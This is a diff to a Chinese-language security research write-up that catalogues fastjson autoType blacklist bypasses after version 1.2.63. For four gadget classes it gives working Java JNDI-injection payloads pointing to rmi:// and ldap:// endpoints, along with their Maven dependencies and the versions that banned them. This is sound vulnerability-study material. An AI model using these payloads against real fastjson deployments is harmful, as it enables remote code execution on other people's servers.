@@ -1197,8 +1197,6 @@ JSON.parseObject(fastSer);
 </dependency>
 ```
 
-
-
 ##### fastjson1.2.46
 
 **修复：**ban掉了JndiDataSourceFactory
@@ -1221,22 +1219,99 @@ JSON.parseObject(fastSer);
 </dependency>
 ```
 
-**fastjson1.2.66**
+##### fastjson1.2.63后
 
-**修复：**ban掉了org.apache.xbean.propertyeditor.JndiConverter
+一个个版本跟过来，发现了黑名单ban危险类的一个问题，即很难去穷尽这些危险的类，这里我也不继续向后写各个版本又ban了哪些类了，这里直接把目前公开的一些Payload整理复现一下。
+
+**修复：**ban掉了org.apache.xbean.propertyeditor.JndiConverter（在maven和github上，在1.2.62和1.2.66之间，只有一个1.2.63）
 
 **绕过：**新发现黑名单之外的类
 
 **Payload:**
 
+**com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig**  **1.2.67被ban**
+
+我没有复现成功，除了一个`Ibatis Sqlmap`的依赖外（像Spring、druid这些流行的框架和模块都依赖它），还需要Java EE下的一些依赖。我在复现过程中，发现1.2.63、1.2.25会出现`autoType is not support`但是并不是被ban掉了，具体原因我也没有分析
+
 ```json
+ String fastSer =  "{\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\":{\"@type\":\"java.util.Properties\",\"UserTransaction\":\"rmi://127.0.0.1:1999/Obj\"}}";
+System.out.println(fastSer);
+ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  //开启autoTypeSupport
+JSON.parseObject(fastSer);
 ```
 
+除了下列依赖，还依赖一些java ee中的类
 
+```xml
+<dependency>
+    <groupId>org.apache.ibatis</groupId>
+    <artifactId>ibatis-sqlmap</artifactId>
+    <version>2.3.4.726</version>
+</dependency>
+```
 
-### 补充一下其他利用链
+**org.apache.shiro.jndi.JndiObjectFactory**  **1.2.68被ban**
+
+```java
+String fastSer =  " {\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"rmi://127.0.0.1:1999/obj\"} ";
+System.out.println(fastSer);
+ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  //开启autoTypeSupport
+JSON.parseObject(fastSer);
+```
+
+这里的依赖shiro也不过多介绍了，很流行的一个鉴权框架
+
+```xml
+<dependency>
+    <groupId>org.apache.shiro</groupId>
+    <artifactId>shiro-core</artifactId>
+    <version>1.9.1</version> <!-- 可根据实际情况选择合适版本 -->
+</dependency>
+```
+
+**br.com.anteros.dbcp.AnterosDBCPConfig** **1.2.67被ban**
+
+```java
+String fastSer =  "{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"ldap://127.0.0.1:1999/Obj\"}";
+System.out.println(fastSer);
+ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  //开启autoTypeSupport
+JSON.parseObject(fastSer);
+```
+
+这个payload的依赖在Jackson中同样被使用过，但是我感觉不太知名的样子，maven中看不到其他框架或库对它的引用，github上star也很少
+
+```xml
+<dependency>
+    <groupId>br.com.anteros</groupId>
+    <artifactId>Anteros-DBCP</artifactId>
+    <version>1.0.1</version>
+</dependency>
+```
+
+**org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup** **1.2.68被ban**
+
+```java
+String fastSer =  " {\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\",\"jndiNames\":\"rmi://127.0.0.1:1999/Obj\"}";
+System.out.println(fastSer);
+ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  //开启autoTypeSupport
+JSON.parseObject(fastSer);
+```
+
+这个我也没有复现成功，除了以下依赖，还依赖于Java EE中的一些类
+
+```xml
+<dependency>
+    <groupId>org.apache.ignite</groupId>
+    <artifactId>ignite-core</artifactId>
+    <version>3.0.0</version>
+</dependency>
+```
+
+### 补充一下出网的利用方式
 
 ### Payload一览
+
+由于针对fastjson不同版本的Payload比较多也比较杂，这里把几个适用版本多、限制条件相对较小的列在这里
 
 ### 对于内置类的回顾
 
